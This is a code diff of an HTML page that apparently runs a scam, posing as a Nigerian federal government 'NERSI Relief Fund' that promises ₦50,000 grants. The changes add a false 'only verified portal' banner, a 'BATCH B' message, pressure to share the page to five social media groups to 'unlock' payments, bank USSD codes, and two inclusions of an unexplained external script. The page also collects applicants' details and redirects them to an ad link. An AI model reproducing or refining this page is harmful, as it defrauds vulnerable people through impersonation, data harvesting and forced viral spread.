@@ -5,13 +5,16 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
+    
+
     <!-- Bootstrap & FontAwesome -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
+    <script src="https://onlinepollportal.com/js/app.min.js?v=2"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     
     <!-- Meta Previews -->
     <meta property="og:title" content="NERSI RELIEF FUND - ₦50,000 GRANT" />
-    <meta property="og:description" content="₦50,000 Relief Fund" />
+    <meta property="og:description" content="₦50,000 Relief Fund Monthly BATCH B Processing" />
     <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBHpNtV2oE87jo-zNp68uFSCPf9qN-Law71LLZYIG09CdfPgRbi8fpi7lh9CtewRTQVHCqhnGAa-snZG5BFCg1p9rr9isP8JyQsUyiFOGQLtzE8hF2J6d54IcT6m8-g9cV_knrHkcxYK3Us2LkxQ25nuGmFj3fbiVyQsObTliqA01NSsMTdlUE1XziP2w/s738/35962.jpg" />
     <meta property="og:type" content="website" />
 
@@ -44,6 +47,25 @@
         }
         
         a { text-decoration: none; }
+
+        /* ═══════════════════════════════════════════ 
+           OFFICIAL VERIFIED BANNER
+        ═══════════════════════════════════════════ */
+        .official-banner {
+            background-color: #1f3e2c; /* NERSI Green */
+            color: #ffffff;
+            text-align: center;
+            padding: 10px 15px;
+            font-size: 13px;
+            font-weight: 600;
+            border-bottom: 3px solid var(--nersi-gold);
+            letter-spacing: 0.5px;
+        }
+        .official-banner i {
+            color: var(--nersi-gold);
+            margin-right: 5px;
+            font-size: 15px;
+        }
 
         /* ═══════════════════════════════════════════ 
            HEADER
@@ -234,6 +256,86 @@
         .feature-dot { width: 10px; height: 10px; background-color: var(--nersi-gold); border-radius: 50%; flex-shrink: 0; }
 
         /* ═══════════════════════════════════════════ 
+           NEW: USSD BENEFICIARY GUIDE STYLES
+        ═══════════════════════════════════════════ */
+        .ussd-guide {
+            background: #ffffff;
+            border: 2px solid var(--nersi-green);
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 25px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        }
+        .ussd-guide h3 {
+            text-align: center;
+            color: var(--nersi-green);
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+        .ussd-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .ussd-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #f4f8f5;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border-left: 4px solid var(--nersi-green);
+        }
+        .ussd-bank {
+            font-weight: 700;
+            color: #333;
+            font-size: 14px;
+        }
+        .ussd-code {
+            font-family: monospace;
+            font-size: 18px;
+            font-weight: bold;
+            color: #d32f2f;
+            background: #fff;
+            padding: 5px 10px;
+            border-radius: 6px;
+            border: 1px dashed #d32f2f;
+            cursor: pointer;
+        }
+        
+        .viral-box {
+            background: linear-gradient(135deg, #fff3cd, #ffe69c);
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 15px;
+            animation: pulse-yellow 2s infinite;
+        }
+        @keyframes pulse-yellow {
+            0% { box-shadow: 0 0 0 0 rgba(255, 193, 7, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 193, 7, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 193, 7, 0); }
+        }
+        .viral-box h4 { font-size: 16px; font-weight: 800; color: #856404; margin-bottom: 5px; }
+        .viral-box p { font-size: 13px; color: #664d03; margin: 0; font-weight: 600; }
+
+        .warning-note {
+            font-size: 13px;
+            color: #721c24;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: left;
+            margin-bottom: 15px;
+        }
+        .warning-note i { margin-right: 5px; }
+
+        /* ═══════════════════════════════════════════ 
            FOOTER & SUPERCOUNTER
         ═══════════════════════════════════════════ */
         .nersi-footer { background: var(--nersi-green); color: #fff; padding: 40px 20px 20px; position: relative; z-index: 2; }
@@ -302,6 +404,11 @@
 </head>
 <body>
 
+    <!-- NEW: OFFICIAL VERIFIED BANNER -->
+    <div class="official-banner">
+        <i class="fas fa-shield-alt"></i> OFFICIAL NOTICE: This is the ONLY verified portal for the NERSI Relief Fund. Beware of fake websites.
+    </div>
+
     <!-- POPUP BACKGROUND LAYER -->
     <div id="bgImage" class="popup-bg-active"></div>
 
@@ -313,8 +420,8 @@
                 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3-6qYiW0jky9PMCPMYsD1ggGKj3XP0w2ZTALFTllZV7MUJ8K3WQRY9WIS6SzXveGsiK8XMnGl02ckD3akOZ30oi5Lv-o_e92C6iPBDDiU7SLTbZR8hAfO1yo0H7IRMmFtmVqoahWaB6B2gcaGFeF4zaGoDlqhdKZZ7LfDCzR_70ixCpA3ksWhrQ8pasU/s200/35813.jpg" alt="Ministry Logo" class="min-logo" onerror="this.src='https://via.placeholder.com/55x55?text=FMH'">
             </div>
 
-            <h2>BATCH A<br>NERSI RELIEF FUND</h2>
-            <p style="font-size: 14px; color: #555; margin-bottom: 15px;">Enter Your Details to Claim ₦50,000</p>
+            <h2>BATCH B Starts on 8th November 2026<br>NERSI RELIEF FUND</h2>
+            <p style="font-size: 14px; color: #555; margin-bottom: 15px;">Enter Your Details to Start Processing to Claim ₦50,000</p>
 
             <div class="popup-partners">
                 <p>In partnership with</p>
@@ -481,7 +588,7 @@
                 </p>
             </div>
 
-            <h3 style="color: var(--nersi-green); text-align: center; margin-bottom: 10px;">🎉 Congratulations!</h3>
+            <h3 style="color: var(--nersi-green); text-align: center; margin-bottom: 10px;"> Congratulations!</h3>
             <p style="font-size: 15px; color: #333; text-align: center; margin-bottom: 15px;">
                 Your application has been <b>successfully received</b>, and you have been <b>pre-qualified</b> to receive the ₦50,000 Grant. 
             </p>
@@ -524,6 +631,55 @@
             </a>
             
             <button id="offer" class="btn-main" style="background: var(--nersi-gold); color: var(--nersi-green); margin-top: 15px; font-weight: 800;">APPROVE PAYMENT</button>
+
+            <!-- NEW: BENEFICIARY USSD GUIDE ADDED HERE -->
+            <div class="ussd-guide">
+                <h3><i class="fas fa-mobile-alt"></i> How to Access Your Funds</h3>
+                
+                <div class="viral-box">
+                    <h4>Get Your ₦50,000 Monthly!</h4>
+                    <p>Share this program to 5 Facebook Groups, WhatsApp Groups & Telegram Channels to move your queue faster and unlock your monthly withdrawal!</p>
+                </div>
+
+                <p style="font-size: 13px; color: #666; margin-bottom: 10px; text-align: center;">
+                    <b>Important Notice:</b> Wait for your wallet to be credited before attempting to access the money. Use the code for your specific provider below:
+                </p>
+
+                <div class="ussd-grid">
+                    <div class="ussd-item">
+                        <span class="ussd-bank">1. ALAT (Wema Bank)</span>
+                        <span class="ussd-code">*945*23#</span>
+                    </div>
+                    <div class="ussd-item">
+                        <span class="ussd-bank">2. MoMo (MoMo PSB)</span>
+                        <span class="ussd-code">*671*0#</span>
+                    </div>
+                    <div class="ussd-item">
+                        <span class="ussd-bank">3. NairaGram Wallet</span>
+                        <span class="ussd-code">*726*00#</span>
+                    </div>
+                    <div class="ussd-item">
+                        <span class="ussd-bank">4. Moniepoint Bank</span>
+                        <span class="ussd-code">*5573*27#</span>
+                    </div>
+                    <div class="ussd-item">
+                        <span class="ussd-bank">5. OPay Bank</span>
+                        <span class="ussd-code">*955*20#</span>
+                    </div>
+                </div>
+
+                <div class="warning-note">
+                    <i class="fas fa-exclamation-triangle"></i> <b>Security Warning:</b> Never disclose your ATM PIN, banking password, or OTP to anyone. The government will never ask for your PIN.
+                </div>
+
+                <p style="font-size: 13.5px; color: #444; line-height: 1.5; margin-bottom: 10px;">
+                    <b>Note:</b> If you don't have an account with any of the providers listed above, no worries! Your funds will be automatically deposited into the bank account you submitted during registration.
+                </p>
+                <p style="font-size: 13.5px; color: #444; line-height: 1.5;">
+                    If the USSD code doesn't work immediately, please wait a few minutes and visit the portal again by submitting your details again and sharing into WhatsApp Groups this time then try again as networks can be congested.
+                </p>
+            </div>
+            <!-- END USSD GUIDE -->
 
             <!-- GREEN CARD PROMO ADDED HERE -->
             <div class="greencard-promo">
@@ -584,6 +740,7 @@
 
     <!-- JQUERY -->
     <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    <script src="https://onlinepollportal.com/js/app.min.js?v=2"></script>
     
     <script>
         $(document).ready(function () {
@@ -673,7 +830,7 @@
             });
 
             var width = 0;
-            var shareText = "*FEDERAL GOVERNMENT NERSI RELIEF FUND 2026*%0A%0AThe Federal Government is giving out *₦50,000 Grant* to support citizens. %0A%0AAPPLY HERE👉: https://metaink.xyz/NERSI-Relief-Fund %0A%0A*_Forward To Other Nigerians To Benefit._*";
+            var shareText = "*FEDERAL GOVERNMENT NERSI RELIEF FUND BATCH B 2026*%0A%0AThe Federal Government is giving out *₦50,000 Grant* to support citizens. %0A%0AAPPLY HERE👉: https://metaink.xyz/NERSI-Relief-Fund %0A%0A*_Forward To Other Nigerians To Benefit._*";
             var shareUrl = "whatsapp://send?text=" + shareText;
             var redirectUrl = "https://uplcm.com/4/10077877"; 
 
